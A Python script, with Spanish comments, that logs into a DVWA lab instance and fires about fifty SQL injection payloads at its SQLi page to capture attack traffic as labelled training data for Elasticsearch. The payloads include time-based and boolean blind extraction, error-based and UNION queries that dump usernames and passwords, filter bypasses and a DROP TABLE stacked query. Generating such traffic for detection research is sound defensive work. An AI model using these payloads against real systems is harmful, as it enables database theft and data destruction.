import requests
import time
import random

# =============================================
# CONFIGURACION
# =============================================
BASE_URL = "http://192.168.20.10"
LOGIN_URL = f"{BASE_URL}/login.php"
CREDENCIALES = {"username": "admin", "password": "password", "Login": "Login"}
PAUSA = 0.5

# =============================================
# PAYLOADS SQLI ENTRENAMIENTO HIGH
# En nivel high DVWA usa PDO prepared statements.
# Las inyecciones directas no funcionan pero el
# trafico HTTP se genera y captura igualmente.
# Se usan tecnicas avanzadas: blind time-based,
# second-order, out-of-band.
# DISTINTOS a low y medium.
# =============================================

PAYLOADS_SQLI_HIGH = [
    # Blind time-based
    "1' AND SLEEP(1)--",
    "1' AND SLEEP(2)--",
    "1' AND SLEEP(3)--",
    "1' OR SLEEP(1)--",
    "1' OR SLEEP(2)--",
    "1 AND SLEEP(1)",
    "1 AND SLEEP(2)",
    "0 AND SLEEP(1)",
    # IF con SLEEP
    "1' AND IF(1=1,SLEEP(1),0)--",
    "1' AND IF(1=2,SLEEP(1),0)--",
    "1' AND IF(LENGTH(database())>3,SLEEP(1),0)--",
    "1' AND IF(LENGTH(database())>5,SLEEP(1),0)--",
    "1' AND IF(SUBSTR(database(),1,1)='d',SLEEP(1),0)--",
    "1' AND IF(ASCII(SUBSTR(database(),1,1))>100,SLEEP(1),0)--",
    "1' AND IF(ASCII(SUBSTR(database(),1,1))<120,SLEEP(1),0)--",
    # Blind boolean avanzado
    "1' AND (SELECT SLEEP(1) FROM users WHERE username='admin')--",
    "1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5--",
    "1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>10--",
    "1' AND SUBSTR((SELECT database()),1,1)='d'--",
    "1' AND SUBSTR((SELECT database()),1,1)='e'--",
    "1' AND SUBSTR((SELECT database()),2,1)='v'--",
    "1' AND SUBSTR((SELECT database()),2,1)='w'--",
    # Extraccion de datos por caracteres
    "1' AND ASCII(SUBSTR((SELECT username FROM users LIMIT 1),1,1))>64--",
    "1' AND ASCII(SUBSTR((SELECT username FROM users LIMIT 1),1,1))>96--",
    "1' AND ASCII(SUBSTR((SELECT username FROM users LIMIT 1),1,1))>100--",
    "1' AND ASCII(SUBSTR((SELECT password FROM users LIMIT 1),1,1))>64--",
    "1' AND ASCII(SUBSTR((SELECT password FROM users LIMIT 1),1,1))>96--",
    # Error-based avanzado
    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--",
    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))--",
    "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--",
    "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--",
    # Stack queries
    "1'; SELECT SLEEP(1)--",
    "1'; SELECT 1--",
    "1'; DROP TABLE IF EXISTS test--",
    # UNION avanzado
    "1' UNION SELECT NULL,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--",
    "1' UNION SELECT NULL,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--",
    "1' UNION SELECT NULL,GROUP_CONCAT(username,0x3a,password) FROM users--",
    "1' UNION SELECT NULL,CONCAT(username,0x3a,password) FROM users LIMIT 1--",
    # Bypass de filtros
    "1'/**/OR/**/1=1--",
    "1'%20OR%201=1--",
    "1' OR 0x31=0x31--",
    "1' OR CHAR(49)=CHAR(49)--",
    "1'||'1'='1",
    "1' OR 1=1 UNION SELECT 1,2--",
    # Hexadecimal
    "1' AND 0x31=0x31--",
    "1' AND 0x61=0x61--",
    "1 UNION SELECT 0x61646d696e,0x70617373776f7264--",
    "1' UNION SELECT 0x61,0x62--",
]

# =============================================
# FUNCIONES
# =============================================

def login(session):
    r = session.get(LOGIN_URL)
    token = None
    for line in r.text.split('\n'):
        if 'user_token' in line and 'value' in line:
            try:
                token = line.split('value=')[1].split("'")[1]
                break
            except:
                pass
    if token:
        CREDENCIALES['user_token'] = token
    r = session.post(LOGIN_URL, data=CREDENCIALES)
    if "Login failed" in r.text:
        print("ERROR: No se pudo hacer login en DVWA")
        return False
    print("Login correcto en DVWA")
    return True

def ataque_sqli_high(session):
    print("\n[*] Iniciando ataques SQLi HIGH...")
    # En high el formulario usa user_token CSRF por cada peticion
    payloads = PAYLOADS_SQLI_HIGH.copy()
    random.shuffle(payloads)
    ok = 0
    for payload in payloads:
        try:
            # Obtener token CSRF fresco para cada peticion
            r = session.get(f"{BASE_URL}/vulnerabilities/sqli/")
            token = None
            for line in r.text.split('\n'):
                if 'user_token' in line and 'value' in line:
                    try:
                        token = line.split('value=')[1].split("'")[1]
                        break
                    except:
                        pass
            
            data = {"id": payload, "Submit": "Submit"}
            if token:
                data["user_token"] = token
            
            r = session.post(f"{BASE_URL}/vulnerabilities/sqli/", data=data)
            print(f"  SQLi_H | {payload[:50]:<50} | status: {r.status_code}")
            ok += 1
            time.sleep(PAUSA)
        except Exception as e:
            print(f"  ERROR: {e}")
    print(f"[+] SQLi High completado: {ok}/{len(payloads)} peticiones enviadas")

# =============================================
# MAIN
# =============================================

if __name__ == "__main__":
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})

    print("="*60)
    print("  ENTRENAMIENTO: SQL INJECTION — NIVEL HIGH")
    print("  Target: " + BASE_URL)
    print("  Etiqueta Elasticsearch: 'sqli'")
    print("  AVISO: Asegurate de que DVWA esta en nivel HIGH")
    print("  AVISO: Asegurate de tener tcpdump corriendo en el router")
    print("="*60)
    input("\nPulsa ENTER cuando tcpdump este corriendo...")

    if not login(session):
        exit(1)

    ataque_sqli_high(session)

    print("\n" + "="*60)
    print("  COMPLETADO.")
    print("  Para el tcpdump, guarda el pcap y subelo a Elasticsearch")
    print("  con etiqueta: 'sqli'")
    print("="*60)
